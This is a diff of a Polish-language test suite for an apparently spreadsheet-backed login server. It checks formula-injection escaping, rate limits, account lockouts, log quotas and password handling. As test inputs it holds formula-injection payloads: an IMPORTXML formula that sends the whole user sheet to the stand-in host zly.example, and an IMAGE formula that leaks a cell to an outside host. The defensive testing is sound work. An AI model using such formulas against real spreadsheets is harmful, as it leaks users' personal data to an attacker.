@@ -24,6 +24,13 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('żadne pole od klienta nie trafia do arkusza jako formuła (puls, sesja, reset, zmiana hasła, logowanie, dziennik)', B.formuly().length === 0, JSON.stringify(B.formuly()));
   const s = B.get('Uzytkownicy').w[1];
   ok('tekst z formułą zostaje w arkuszu jako zwykły tekst (z apostrofem), a nie znika', String(s[6]).startsWith("'") || s[6] === '', String(s[6]).slice(0, 30));
+  // arkusz oddaje tekst „'=…” bez apostrofu: puls z pustym polem nie może zapisać tej wartości z powrotem (stałaby się formułą)
+  const C = swiezy();
+  C.post({ akcja: 'puls', kod: '12345', system: '=IMAGE("http://x.yz/"&N2)', wersja: '=1+1' }, { haslo: 'haslo123' });
+  C.post({ akcja: 'puls', kod: '12345', system: '', wersja: '' }, { haslo: 'haslo123' });
+  ok('drugi puls z pustym „system” i „wersja” nie zamienia zapisanego tekstu w formułę', C.formuly().length === 0 && /^'=IMAGE/.test(C.get('Uzytkownicy').w[1][6]) && C.get('Uzytkownicy').w[1][5] === "'=1+1", JSON.stringify(C.formuly()));
+  C.post({ akcja: 'puls', kod: '12345', system: 'Web' }, { haslo: 'haslo123' }); C.post({ akcja: 'puls', kod: '12345', system: '' }, { haslo: 'haslo123' });
+  ok('puls z pustym polem zostawia dotychczasową zwykłą wartość', C.get('Uzytkownicy').w[1][6] === 'Web');
 }
 /* ---- 2. puls i konta ---- */
 {
@@ -73,7 +80,13 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 {
   const B = swiezy();
   ok('logowanie hasłem', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).imie === 'Jan Testowy');
-  ok('konto z hasłem nie wpuszcza telefonem', /ustawione haslo/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).opis));
+  ok('konto z hasłem nie wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '12345', haslo: '600100200' }).status === 'blad');
+  ok('telefon z kartoteki na koncie z hasłem dostaje ten sam komunikat co zły numer i złe hasło (odpowiedź nie potwierdza numeru)', (() => {
+    const o = ['600100200', '600100201', 'zlehaslo'].map(h => B.post({ akcja: 'logowanie', kod: '12345', haslo: h }));
+    const z = ['600100200', '600100201', 'zlehaslo'].map(h => B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: h, nowe_haslo: 'przejete123' }));
+    return o.every(x => x.status === 'blad' && x.opis === o[0].opis) && /Nieprawidlowe haslo/.test(o[0].opis) && z.every(x => x.status === 'blad' && x.opis === z[0].opis); })());
+  ok('…a w Log zostaje prawdziwy powód odmowy zmiany hasła (dla administratora)', B.get('Log').w.some(r => r[2] === 'zmiana_hasla' && /telefon zamiast hasla/.test(r[3])));
+  B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' });      // zeruje licznik prób po powyższych
   ok('konto bez hasła wpuszcza telefonem', B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).status === 'ok');
   ok('logowanie mówi, czym weszło (klient zakłada sejf tą samą postacią hasła)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).przez === 'haslo' && B.post({ akcja: 'logowanie', kod: '22222', haslo: '501 502 503' }).przez === 'telefon');
   ok('każda odpowiedź, także odmowa, niesie czas serwera (poprawka zegara urządzenia)', [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }), B.post({ akcja: 'nieznana', kod: '12345' }), B.post({ akcja: 'puls', kod: '12345' })].every(o => Math.abs(o.czas_serwera - Date.now() / 1000) < 5));
@@ -87,13 +100,45 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 }
 /* ---- 5. limit dzienników ---- */
 {
-  const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50;' });
-  for (let i = 0; i < 400; i++) B.post({ akcja: 'reset_hasla', kod: '1234' + (i % 10), telefon: '1' });
+  const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50; WAZNYCH_NA_KOD = 20; WAZNYCH_NA_GODZINE = 30;' });
+  for (let i = 0; i < 400; i++) B.post({ akcja: 'zmien_haslo', kod: '33333', stare_haslo: 'zle' + i, nowe_haslo: 'abcdefgh' });      // istniejące konto: odmowy zostawiają wpisy (zwykła pula po przydziale „konto”)
+  for (let i = 0; i < 400; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // nieznany kod: wspólny licznik, jeden wpis o zgadywaniu
+  const wpisow = B.get('Log').getLastRow() - 1;
+  ok('dziennik ma limit wpisów na godzinę (400 odrzuconych logowań → nie więcej niż limit)', wpisow > 0 && wpisow <= 50, 'wpisów: ' + wpisow);
   for (let i = 0; i < 400; i++) B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
-  const wpisow = (B.get('Log') ? B.get('Log').getLastRow() : 0) + (B.get('Sesje') ? B.get('Sesje').getLastRow() : 0) - 2;
-  ok('dzienniki mają limit wpisów na godzinę (800 zapytań → nie więcej niż limit)', wpisow <= 52, 'wpisów: ' + wpisow);
+  const sesji = B.get('Sesje').getLastRow() - 1;
+  ok('wpisy po uwierzytelnieniu (rejestr sesji) mają osobny przydział z limitem na kod (400 → 20), potem tylko resztka wspólnej puli', sesji >= 20 && sesji <= 20 + 50, 'wpisów: ' + sesji + ', w Log: ' + wpisow);
+  const L0 = B.get('Log').getLastRow();
+  B.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }); B.post({ akcja: 'zmien_haslo', kod: '33333', stare_haslo: '700800900', nowe_haslo: 'noweHaslo9' }); B.post({ akcja: 'logowanie', kod: '33333', haslo: 'noweHaslo9' });
+  ok('po zalewie dzienników udany reset, zmiana hasła i logowanie innego konta dalej są w Log', B.get('Log').w.slice(L0).map(r => r[2] + ':' + r[3]).join() === 'reset_hasla:OK,zmiana_hasla:OK (telefonem),logowanie_www:OK (haslo)', JSON.stringify(B.get('Log').w.slice(L0).map(r => r.slice(1, 4))));
   B.dalej(3601 * 1000); const przed = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'wylogowanie' }, { haslo: 'haslo123' });
   ok('po godzinie dzienniki znów przyjmują wpisy', B.get('Sesje').getLastRow() === przed + 1);
+}
+/* ---- 5b. zalew zapytań bez hasła nie ukrywa zdarzeń bezpieczeństwa ---- */
+{
+  const B = swiezy(); const H = { haslo: 'haslo123' };
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  const L0 = B.get('Log').getLastRow();
+  for (let i = 0; i < 3001; i++) B.post({ akcja: 'reset_hasla', kod: 'x' + i, telefon: '1' });
+  for (let i = 0; i < 3000; i++) B.post({ akcja: 'haslo_paczki', kod: '99999' }, { bezPodpisu: true });
+  for (let i = 0; i < 3001; i++) B.post({ akcja: 'haslo_paczki', kod: String(40000 + i) }, { bezPodpisu: true });      // za każdym razem inny kod
+  for (let i = 0; i < 3010; i++) B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600000000' });      // przekroczony limit resetu jednego kodu
+  const wpisy = B.get('Log').w.slice(L0).map(r => r[2] + ' ' + r[3]);
+  ok('9000 śmieciowych zapytań (zły format kodu, odmowy hasła paczki z różnymi kodami, reset ponad limit) zostawia najwyżej 20 wpisów na zdarzenie na godzinę', wpisy.length <= 70 && wpisy.filter(w => /za duzo prob/.test(w)).length <= 20, 'wpisów: ' + wpisy.length);
+  ok('…a odmowy dotyczące istniejącego konta (zły telefon w resecie) zostają w Log', wpisy.filter(w => /zly telefon/.test(w)).length === 5, String(wpisy.filter(w => /zly telefon/.test(w)).length));
+  B.dalej(3601 * 1000);
+  for (let i = 0; i < 3100; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'x' + i });      // wspólna pula wyczerpana (zalew odmów)
+  for (let i = 0; i < 3100; i++) B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '111111111', nowe_haslo: 'abcdefgh' });
+  B.dalej(16 * 60 * 1000); for (const k of ['lg:k:12345', 'lg:d:12345']) B.pamiec.delete(k);
+  const L1 = B.get('Log').getLastRow();
+  const odp = [B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }), B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: '600100200', nowe_haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'logowanie', kod: '12345', haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'Nowe-haslo-1' })];
+  const nowe = B.get('Log').w.slice(L1).map(r => r[2]);
+  ok('przy wyczerpanej wspólnej puli reset, zmiana hasła, logowanie i wydanie hasła paczki zostawiają ślad', odp.every(o => o.status === 'ok') && nowe.join() === 'reset_hasla,zmiana_hasla,logowanie_www,haslo_paczki', JSON.stringify(nowe));
+  B.dalej(3601 * 1000); const L2 = B.get('Log').getLastRow(); B.post({ akcja: 'reset_hasla', kod: 'x', telefon: '1' });
+  ok('po godzinie zagregowane zdarzenie znów zostawia wpis', B.get('Log').getLastRow() === L2 + 1);
+  const ileKluczy = () => B.pamiec.size, K0 = ileKluczy();
+  for (let i = 0; i < 2000; i++) { B.post({ akcja: 'logowanie', kod: String(60000 + i), haslo: 'cokolwiek1' }); B.post({ akcja: 'reset_hasla', kod: String(70000 + i), telefon: '600000000' }); B.post({ akcja: 'zmien_haslo', kod: String(80000 + i), stare_haslo: 'x', nowe_haslo: 'abcdefgh' }); }
+  ok('6000 zapytań na nieistniejące kody nie zakłada w pamięci podręcznej kluczy na kod (liczniki prawdziwych kont nie wypadają przy przepełnieniu)', ileKluczy() - K0 <= 10, 'nowych kluczy: ' + (ileKluczy() - K0));
 }
 /* ---- 6. podpis ---- */
 {
@@ -178,9 +223,118 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('administrator wpisuje nowe hasło i nowy termin → od razu obowiązuje (bez zmian w aplikacji)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === 'Nowe-Haslo-na-grudzien' && r.wazne_do === '2099-01-31'; })());
   wpisz('haslo_paczki_wazne_do', new Date('2099-03-05T00:00:00')); wpisz('haslo_paczki', 123456789);
   ok('arkusz zamienia wpisaną datę na datę, a numeryczne hasło na liczbę — obie postacie działają (data → RRRR-MM-DD, liczba → tekst)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); return r.status === 'ok' && r.haslo === '123456789' && r.wazne_do === '2099-03-05'; })());
+  ok('nowa zakładka Ustawienia ma komórkę hasła w formacie tekstowym (zera wiodące i daty zostają tym, co wpisano)', ust().formaty['2,2'] === '@' && ust().formaty['3,2'] === undefined, JSON.stringify(ust().formaty));
+  for (const [opis, v] of [['data', new B.ctx.Date('2027-01-15T00:00:00')], ['wartość logiczna', true], ['ułamek („1234,5678” w polskim arkuszu)', 1234.5678], ['liczba bez pełnej precyzji', 12345678901234567890]]) {
+    wpisz('haslo_paczki', v); const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, H);
+    ok(`komórka hasła z wartością innego typu (${opis}) → „brak”, hasło nie wychodzi`, r.status === 'brak' && !('haslo' in r), JSON.stringify(r));
+  }
+  ok('…a Log mówi administratorowi, co poprawić', B.get('Log').w.some(r => r[2] === 'haslo_paczki_blad' && /Zwykly tekst/.test(r[3])));
   wpisz('haslo_paczki', '   ');
   ok('samo odstępy w polu hasła = wysyłka wyłączona („brak”)', B.post({ akcja: 'haslo_paczki', kod: '12345' }, H).status === 'brak');
   ok('zakładka Ustawienia nie jest nadpisywana przez zapytania klienta (żadna akcja nie zapisuje tam danych od klienta)', ust().w.length === 4);
   ok('istniejąca zakładka „Ustawienia” bez wiersza adresu (ze starszej wersji skryptu) jest uzupełniona o ten wiersz przy następnym wywołaniu inicjalizuj()', (() => { const C = swiezy(); C.get('Ustawienia').w.pop(); C.wywolaj('inicjalizuj()'); return C.get('Ustawienia').w.length === 4 && C.get('Ustawienia').w[3][0] === 'adres_odbiorcy'; })());
+}
+/* ---- 9. podpis hasłem nie jest wyrocznią do zgadywania hasła bez limitu ---- */
+{
+  const B = swiezy(); let trafien = 0;
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  const wpisyLog = () => B.get('Log').getLastRow();
+  for (let i = 0; i < 149; i++) if (B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'kandydat' + i }).pelne) trafien++;
+  ok('149 złych podpisów hasłem (np. karta ze starym hasłem pulsująca co 5 min przez dzień pracy) — dobry podpis dalej przechodzi', trafien === 0 && B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+  const logPrzed = wpisyLog();
+  for (let i = 0; i < 300; i++) B.post({ akcja: i % 2 ? 'puls' : 'haslo_paczki', kod: '12345' }, { haslo: 'kandydat-b' + i });
+  const p = B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' });
+  ok('po przekroczeniu limitu złych podpisów nawet trafione hasło nie daje „pelne” (wyrocznia zamknięta)', p.pelne === false && p.imie === '' && p.status === 'ok', JSON.stringify(p));
+  ok('…haslo_paczki też odmawia (hasło paczki nie wychodzi)', (() => { const r = B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }); return r.status === 'odmowa' && !('haslo' in r); })());
+  ok('…a sesja nie dopisuje wpisu', (() => { const n = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' }); return B.get('Sesje').getLastRow() === n; })());
+  ok('zablokowanie podpisów hasłem zostawia JEDEN wpis w Log', B.get('Log').w.slice(1).filter(r => r[2] === 'podpis_hasla' && /ZABLOKOWANY/.test(r[3])).length === 1 && wpisyLog() > logPrzed);
+  ok('limit dotyczy tylko tego kodu (inne konto pulsuje w pełni)', B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true);
+  ok('złe podpisy hasłem nie blokują logowania (osobny licznik)', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok');
+  ok('udane logowanie hasłem zdejmuje blokadę podpisów', B.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true && B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'haslo123' }).status === 'ok');
+  const C = swiezy();
+  for (let i = 0; i < 80; i++) C.post({ akcja: 'puls', kod: '12345' });
+  ok('puls bez podpisu hasłem (stary program) nie zużywa limitu', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+  for (let i = 0; i < 160; i++) C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'zle' + i });
+  C.dalej(6 * 3600 * 1000 + 1000);
+  ok('po 6 godzinach (koniec okna) dobry podpis znów przechodzi bez logowania', C.post({ akcja: 'puls', kod: '12345' }, { haslo: 'haslo123' }).pelne === true);
+}
+/* ---- 10. limit resetu hasła: okno stałe, licznik łączny tylko z nieudanych prób ---- */
+{
+  const B = swiezy(); const R = (kod, telefon) => B.post({ akcja: 'reset_hasla', kod, telefon });
+  for (let i = 0; i < 31; i++) R(String(20000 + i), '600000000');
+  ok('31 resetów z wymyślonych kodów wyczerpuje limit łączny (ochrona przed przeszukiwaniem kodów znanym numerem)', /Za duzo prob/.test(R('12345', '600100200').opis || ''));
+  for (let h = 0; h < 5; h++) { B.dalej(59 * 60 * 1000); R('2' + String(1000 + h), '600000000'); }
+  ok('pojedyncze zapytanie co 59 minut nie przedłuża blokady w nieskończoność (okno stałe) — reset prawdziwego konta działa', R('12345', '600100200').status === 'ok');
+  const C = swiezy(); const RC = (kod, telefon) => C.post({ akcja: 'reset_hasla', kod, telefon });
+  const zle = []; for (let i = 0; i < 5; i++) zle.push(RC('12345', '600000000').status);
+  ok('5 prób na kod na godzinę, szósta odrzucona (także z dobrym telefonem)', zle.every(s => s === 'blad') && /Za duzo prob/.test(RC('12345', '600100200').opis || ''));
+  for (let i = 0; i < 20; i++) { C.dalej(60 * 1000); RC('12345', '600000000'); }
+  C.dalej(41 * 60 * 1000);
+  ok('odrzucone próby nie są doliczane: godzinę po pierwszej próbie reset znów działa, mimo ponawiania', RC('12345', '600100200').status === 'ok');
+  ok('zalew jednego kodu nie odbiera resetu innym kontom', (() => { const D = swiezy(); for (let i = 0; i < 40; i++) D.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600000000' }); return D.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }).status === 'ok'; })());
+  ok('udane resety nie zużywają limitu łącznego', (() => { const E = swiezy(); for (let i = 0; i < 29; i++) E.post({ akcja: 'reset_hasla', kod: String(30000 + i), telefon: '1' });
+    const a = E.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }).status, b = E.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }).status;
+    E.post({ akcja: 'reset_hasla', kod: '30099', telefon: '1' }); return a === 'ok' && b === 'ok' && /Za duzo prob/.test(E.post({ akcja: 'reset_hasla', kod: '22222', telefon: '501502503' }).opis || ''); })());
+}
+/* ---- 11. administrator zdejmuje blokady funkcją odblokujKonta (uruchamianą ręcznie w edytorze) ---- */
+{
+  const B = swiezy();
+  for (let i = 0; i < 9; i++) B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' + i });
+  for (let i = 0; i < 151; i++) B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'zle' + i });
+  for (let i = 0; i < 31; i++) B.post({ akcja: 'reset_hasla', kod: String(20000 + i), telefon: '1' });
+  const przed = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status, B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne];
+  B.wywolaj('odblokujKonta()');
+  ok('odblokujKonta() zdejmuje blokadę logowania, podpisów hasłem i resetu', przed[0] === 'blad' && przed[1] === false
+    && B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok' && B.post({ akcja: 'puls', kod: '33333' }, { haslo: 'haslo123' }).pelne === true
+    && B.post({ akcja: 'reset_hasla', kod: '22222', telefon: '501502503' }).status === 'ok', JSON.stringify(przed));
+  ok('odblokowanie zostawia ślad w Log', B.get('Log').w.some(r => r[2] === 'odblokowanie'));
+  ok('odblokujKonta nie jest akcją dostępną przez adres /exec', B.post({ akcja: 'odblokujKonta', kod: '12345' }).opis === 'Nieznana akcja');
+}
+/* ---- 12. brak blokady skryptu (kolejka > 20 s) = odmowa, a nie praca bez blokady ---- */
+{
+  const B = swiezy(); B.blokada.zajety = true; const zw = B.blokada.zwolnien;
+  const odp = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'zle' }), B.post({ akcja: 'puls', kod: '12345', dokumenty: 5 }, { haslo: 'haslo123' })];
+  ok('bez blokady skryptu zapytanie dostaje „Serwer zajety” i nic nie zmienia (ani licznika prób, ani statystyk)', odp.every(o => o.status === 'blad' && /zajety/.test(o.opis))
+    && B.get('Uzytkownicy').w[1][8] === '' && B.wywolaj('_licznik("lg:k:12345", 900, false)') === 0, JSON.stringify(odp[0]));
+  ok('…i nie zwalnia cudzej blokady', B.blokada.zwolnien === zw);
+  B.blokada.zajety = false;
+  ok('gdy blokada wolna, wszystko działa jak dotąd', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123' }).status === 'ok' && B.blokada.zwolnien === zw + 1);
+}
+/* ---- 13. bramka WYMAGANA_WERSJA odcina stare programy, ale nie aplikację web (stały numer silnika 3.24.0 + klient: "web") ---- */
+{
+  const B = swiezy({ ustaw: "WYMAGANA_WERSJA = '3.25.0';" }); const W = { klient: 'web', wersja: '3.24.0' };
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  ok('program starszy niż WYMAGANA_WERSJA jest odcinany', /nie jest juz obslugiwana/.test(B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', wersja: '3.24.0', zrodlo: 'program' }).opis || ''));
+  ok('program w wymaganej wersji wchodzi', B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', wersja: '3.25.1', zrodlo: 'program' }).status === 'ok');
+  const web = [B.post({ akcja: 'logowanie', kod: '12345', haslo: 'haslo123', zrodlo: 'www', ...W }), B.post({ akcja: 'puls', kod: '12345', system: 'Web', ...W }, { haslo: 'haslo123' }), B.post({ akcja: 'haslo_paczki', kod: '12345', ...W }, { haslo: 'haslo123' }),
+    B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: 'haslo123', nowe_haslo: 'nowehaslo1', ...W }), B.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900', ...W })];
+  ok('aplikacja web (klient: "web") działa przy włączonej bramce: logowanie, puls, hasło paczki, zmiana i reset hasła', web.every(o => o.status === 'ok') && web[1].pelne === true, JSON.stringify(web.map(o => o.status + ':' + (o.opis || ''))));
+  ok('kolumna „Wersja” odróżnia aplikację web od programu (web 3.24.0 zamiast 3.24.0)', B.get('Uzytkownicy').w[1][5] === 'web 3.24.0', B.get('Uzytkownicy').w[1][5]);
+  B.post({ akcja: 'puls', kod: '12345', system: 'Windows', wersja: '3.25.1' }, { haslo: 'nowehaslo1' });
+  ok('program zapisuje swoją wersję bez dopisku', B.get('Uzytkownicy').w[1][5] === '3.25.1', B.get('Uzytkownicy').w[1][5]);
+}
+/* ---- 14. daty wpisane jako tekst (komórka tekstowa, arkusz z innymi ustawieniami regionalnymi) ---- */
+{
+  const B = swiezy(); const H = { haslo: 'haslo123' }; const uz = B.get('Uzytkownicy').w[1];
+  const U = B.get('Ustawienia').w; U[1][1] = 'Tajne-Haslo-2026'; U[3][1] = 'odbiorca@firma.pl';
+  const puls = wazne => { uz[3] = wazne; return B.post({ akcja: 'puls', kod: '12345' }, H); };
+  const pl = [puls('31.12.2099'), puls('12.01.2099'), puls('5.3.2099'), puls('2099-12-31'), puls(' 2099-03-05 ')];
+  ok('„Ważne do” jako tekst DD.MM.RRRR i RRRR-MM-DD czytane wprost (dzień przed miesiącem), bez błędu serwera', pl.map(o => o.status + ' ' + o.wazne_do).join() === 'ok 2099-12-31,ok 2099-01-12,ok 2099-03-05,ok 2099-12-31,ok 2099-03-05', JSON.stringify(pl.map(o => [o.status, o.wazne_do, o.opis])));
+  const zle = [puls('31.02.2099'), puls('do odwolania'), puls(46000)];
+  ok('nieczytelna data (31.02, zwykły tekst, liczba) = jak pusta: „wygasla”, bez daty i bez błędu serwera', zle.every(o => o.status === 'wygasla' && o.wazne_do === ''), JSON.stringify(zle.map(o => [o.status, o.wazne_do, o.opis])));
+  ok('…i zostawia w Log wpis z treścią komórki', B.get('Log').w.some(r => r[2] === 'nieczytelna_data' && /31\.02\.2099/.test(r[3])));
+  uz[3] = '31.12.2099';
+  const hp = d => { U[2][1] = d; return B.post({ akcja: 'haslo_paczki', kod: '12345' }, H); };
+  const h1 = hp('12.01.2099'), h2 = hp('31.12.2099'), h3 = hp('2099-02-30');
+  ok('termin hasła paczki DD.MM.RRRR: 12.01.2099 to 12 stycznia (nie 1 grudnia), konto z „Ważne do” jako tekst dostaje hasło', h1.status === 'ok' && h1.wazne_do === '2099-01-12' && h2.wazne_do === '2099-12-31', JSON.stringify([h1, h2]));
+  ok('nieczytelny termin hasła paczki → „brak” (hasło nie wychodzi) i wpis w Log', h3.status === 'brak' && !('haslo' in h3) && B.get('Log').w.some(r => r[2] === 'nieczytelna_data' && /haslo_paczki_wazne_do/.test(r[3])), JSON.stringify(h3));
+}
+/* ---- 15. hasło z odstępem na brzegu: serwer przycina, więc klucz podpisu to skrót PRZYCIĘTEGO hasła (web: dostep.js postacHasla) ---- */
+{
+  const B = swiezy();
+  B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'Haslo123 ' });
+  ok('hasło ustawione ze spacją na końcu: logowanie z tą spacją przechodzi', B.post({ akcja: 'logowanie', kod: '22222', haslo: 'Haslo123 ' }).status === 'ok');
+  ok('…puls z kluczem z hasła przyciętego (tak liczy aplikacja web) oddaje komplet, z kluczem z surowego tekstu — nie', B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123') }).pelne === true
+    && B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123 ') }).pelne === false);
 }
 process.exit(kod);
